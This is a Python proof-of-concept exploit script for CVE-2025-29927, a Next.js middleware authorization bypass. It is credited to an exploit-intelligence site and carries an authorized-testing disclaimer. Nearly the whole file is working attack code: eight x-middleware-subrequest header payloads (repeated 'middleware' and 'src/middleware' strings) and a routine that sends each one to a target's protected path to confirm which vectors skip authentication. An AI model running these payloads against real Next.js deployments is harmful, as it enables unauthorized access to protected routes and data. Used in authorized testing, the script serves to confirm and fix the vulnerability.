#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Next.js Middleware Authorization Bypass (Multi-Vector Scanner)
# CVE            : CVE-2025-29927
# Vendor         : Vercel
# Product        : Next.js
# Affected       : 11.1.4 – 12.3.4, 13.0.0 – 13.5.8, 14.0.0 – 14.2.24, 15.0.0 – 15.2.2
# Type           : CWE-285 - Improper Authorization
# CVSS           : 9.1 (Critical)
# Platform       : Any (Node.js)
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-03-21
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-29927 — Multi-Vector Scanner (Vector 3)

Systematically tests 8 bypass vectors and edge cases to fingerprint the
middleware location and confirm the exact minimum payload that triggers
the bypass.

ATTACK CHAIN:
  1. Send baseline unauthenticated request to establish blocked state
  2. Test each vector: root middleware (5x), src/ (5x), pages/_middleware,
     partial payloads, over-threshold, mixed-case headers, empty values
  3. Report which vectors succeed and validate against expectations

PREREQUISITES:
  - Target running vulnerable Next.js (11.1.4 – 15.2.2) with middleware
  - Network access to the target

REFERENCES:
  - CVE-2025-29927
  - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
"""

import sys
import json
import http.client
import socket

class C:
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    CYAN = "\033[96m"
    BOLD = "\033[1m"
    RESET = "\033[0m"

DEFAULT_HOST = "172.19.0.4"
DEFAULT_PORT = 3000
DEFAULT_PATH = "/api/protected"

# All test vectors with descriptions
VECTORS = [
    # === Standard bypass vectors ===
    {
        "name": "Standard root middleware (5x)",
        "header": "x-middleware-subrequest",
        "value": "middleware:middleware:middleware:middleware:middleware",
        "expect_bypass": True,
        "description": "Standard payload for root middleware.js (v13+)",
    },
    {
        "name": "src/ directory middleware (5x)",
        "header": "x-middleware-subrequest",
        "value": "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
        "expect_bypass": False,  # Our lab uses root middleware, not src/
        "description": "Payload for src/middleware.js (v13+)",
    },
    {
        "name": "Legacy pages middleware (v11-12)",
        "header": "x-middleware-subrequest",
        "value": "pages/_middleware",
        "expect_bypass": False,  # Our lab is v14, uses modern recursion check
        "description": "Payload for pages/_middleware.js (v11-12, no recursion check)",
    },
    # === Edge case: partial payload (should NOT bypass) ===
    {
        "name": "Partial payload (4x — below threshold)",
        "header": "x-middleware-subrequest",
        "value": "middleware:middleware:middleware:middleware",
        "expect_bypass": False,
        "description": "Only 4 repetitions — depth=4 < MAX_RECURSION_DEPTH=5, should NOT bypass",
    },
    {
        "name": "Partial payload (1x)",
        "header": "x-middleware-subrequest",
        "value": "middleware",
        "expect_bypass": False,
        "description": "Single middleware name — depth=1, should NOT bypass on v13+",
    },
    # === Edge case: over-threshold (should still bypass) ===
    {
        "name": "Over-threshold (7x)",
        "header": "x-middleware-subrequest",
        "value": "middleware:middleware:middleware:middleware:middleware:middleware:middleware",
        "expect_bypass": True,
        "description": "7 repetitions — still >= 5, should bypass",
    },
    # === Edge case: case sensitivity of header name ===
    {
        "name": "Mixed-case header name",
        "header": "X-Middleware-Subrequest",
        "value": "middleware:middleware:middleware:middleware:middleware",
        "expect_bypass": True,
        "description": "HTTP headers are case-insensitive per RFC 7230",
    },
    # === Edge case: empty header ===
    {
        "name": "Empty header value",
        "header": "x-middleware-subrequest",
        "value": "",
        "expect_bypass": False,
        "description": "Empty value — should have zero depth, no bypass",
    },
]


def make_request(host, port, path, headers=None, timeout=10):
    """Make an HTTP GET request using stdlib."""
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        all_headers = {"User-Agent": "CVE-2025-29927-PoC-Vector3/1.0"}
        if headers:
            all_headers.update(headers)
        conn.request("GET", path, headers=all_headers)
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        status = resp.status
        conn.close()
        return status, body
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        return None, str(e)


def exploit(host, port, path):
    """Systematically test all bypass vectors and edge cases."""
    target = f"http://{host}:{port}{path}"

    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.BOLD} CVE-2025-29927 — Vector 3: Multi-Vector Scanner{C.RESET}")
    print(f"{C.BOLD}{'='*70}{C.RESET}")
    print(f"\n  Target: {C.YELLOW}{target}{C.RESET}")
    print(f"  Vectors to test: {len(VECTORS)}")

    # Get baseline
    print(f"\n{C.BOLD}[Baseline] Unauthenticated request{C.RESET}")
    baseline_status, baseline_body = make_request(host, port, path)
    if baseline_status is None:
        print(f"  {C.RED}[FAIL] Cannot reach target: {baseline_body}{C.RESET}")
        return False
    print(f"  Status: {baseline_status}")

    # Test each vector
    results = []
    any_bypass = False

    for i, vec in enumerate(VECTORS, 1):
        print(f"\n{C.BOLD}[Vector {i}/{len(VECTORS)}] {vec['name']}{C.RESET}")
        print(f"  {C.CYAN}Description:{C.RESET} {vec['description']}")
        print(f"  {C.CYAN}Header:{C.RESET} {vec['header']}: {vec['value'][:80]}{'...' if len(vec['value']) > 80 else ''}")

        status, body = make_request(
            host, port, path,
            headers={vec["header"]: vec["value"]}
        )

        if status is None:
            print(f"  {C.RED}[ERROR] Request failed{C.RESET}")
            results.append({"vector": vec["name"], "status": "ERROR", "bypassed": False})
            continue

        bypassed = (baseline_status in (401, 403, 302, 307) and status == 200)

        # Show result with expected vs actual
        if bypassed and vec["expect_bypass"]:
            indicator = f"{C.GREEN}✓ BYPASS (expected){C.RESET}"
        elif bypassed and not vec["expect_bypass"]:
            indicator = f"{C.YELLOW}⚠ BYPASS (unexpected!){C.RESET}"
        elif not bypassed and not vec["expect_bypass"]:
            indicator = f"{C.GREEN}✓ BLOCKED (expected){C.RESET}"
        else:
            indicator = f"{C.RED}✗ BLOCKED (expected bypass){C.RESET}"

        print(f"  Status: {status} → {indicator}")

        if bypassed:
            any_bypass = True
            try:
                parsed = json.loads(body)
                print(f"  Body: {json.dumps(parsed)}")
            except (json.JSONDecodeError, TypeError):
                print(f"  Body: {body[:150]}")

        results.append({
            "vector": vec["name"],
            "status": status,
            "bypassed": bypassed,
            "expected": vec["expect_bypass"],
            "correct": bypassed == vec["expect_bypass"],
        })

    # Summary
    print(f"\n{C.BOLD}{'='*70}{C.RESET}")
    print(f"{C.BOLD} Summary{C.RESET}")
    print(f"{C.BOLD}{'='*70}{C.RESET}")

    bypassed_count = sum(1 for r in results if r["bypassed"])
    correct_count = sum(1 for r in results if r.get("correct", False))

    for r in results:
        mark = "✓" if r.get("correct") else "✗"
        bypass_str = "BYPASS" if r["bypassed"] else "BLOCKED"
        print(f"  {mark} {r['vector']}: HTTP {r['status']} → {bypass_str}")

    print(f"\n  Bypass vectors found: {bypassed_count}/{len(results)}")
    print(f"  Behavior matches expectations: {correct_count}/{len(results)}")

    if any_bypass:
        print(f"\n  {C.GREEN}{C.BOLD}[VULNERABLE] CVE-2025-29927 CONFIRMED{C.RESET}")
    else:
        print(f"\n  {C.RED}[NOT VULNERABLE] No bypass vectors succeeded.{C.RESET}")
    print(f"{C.BOLD}{'='*70}{C.RESET}\n")

    return any_bypass


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT
    path = sys.argv[3] if len(sys.argv) > 3 else DEFAULT_PATH
    success = exploit(host, port, path)
    sys.exit(0 if success else 1)
